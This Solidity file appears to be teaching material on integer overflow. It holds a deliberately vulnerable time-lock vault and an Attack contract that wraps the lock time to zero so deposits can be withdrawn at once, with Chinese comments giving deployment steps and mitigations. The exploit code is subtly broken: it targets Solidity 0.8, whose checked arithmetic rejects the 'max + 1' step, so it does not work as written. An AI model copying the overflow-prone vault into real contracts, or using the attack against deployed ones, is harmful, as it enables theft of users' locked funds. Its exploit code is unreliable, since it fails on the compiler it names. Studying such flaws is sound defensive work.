// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeVault
2. Deploy Attack with address of TimeVault
3. 你存入以太坊进入TimeVault合约里，理论上你应该是1个星期后才能取出来，但通过溢出漏洞，你可以立刻取出来。
*/

/*
防范方式：
1. 0.8.0 以上的solidity版本，会自动抛出溢出错误。
2. 通过SafeMath(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol)来阻止数学溢出
*/

contract TimeVault {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public preyAddr;

    constructor(address _preyAddrAddress) {
        preyAddr = _preyAddrAddress;
    }

    fallback() external payable {}

    function deposit() public payable {
        (bool success, ) = preyAddr.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposit function, failed to deposit");
    }

    // 攻击测试一： 手动存款，手动设置时间触发溢出漏洞
    function attack1(uint256 timesec) public payable {
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        // uint timesec;
        // preyAddr.call(abi.encodeWithSignature("lockTime(address)",address(this)));

        (bool success, ) = preyAddr.call(
            abi.encodeWithSignature(
                "increaseLockTime(uint256)",
                type(uint256).max + 1 - timesec
            )
        );
        require(success, "attack function, failed to increaseLockTime");
        preyAddr.call(abi.encodeWithSignature("withdraw()"));
    }

    // 攻击测试二： 存款，触发漏洞，取款
    function attack2() public payable {
        // 存款
        (bool success1, ) = preyAddr.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success1, "deposit function, failed to deposit");
        // uint timesec;
        (bool success2, bytes memory data) = preyAddr.call(
            abi.encodeWithSignature("lockTime(address)", address(this))
        );
        require(success2, "attack function, failed to increaseLockTime");
        uint256 timesec;
        timesec = abi.decode(data, (uint256));
        // 取款
        (bool success3, ) = preyAddr.call(
            abi.encodeWithSignature(
                "increaseLockTime(uint256)",
                type(uint256).max + 1 - timesec
            )
        );
        require(success3, "attack function, failed to increaseLockTime");
        preyAddr.call(abi.encodeWithSignature("withdraw()"));
    }
}
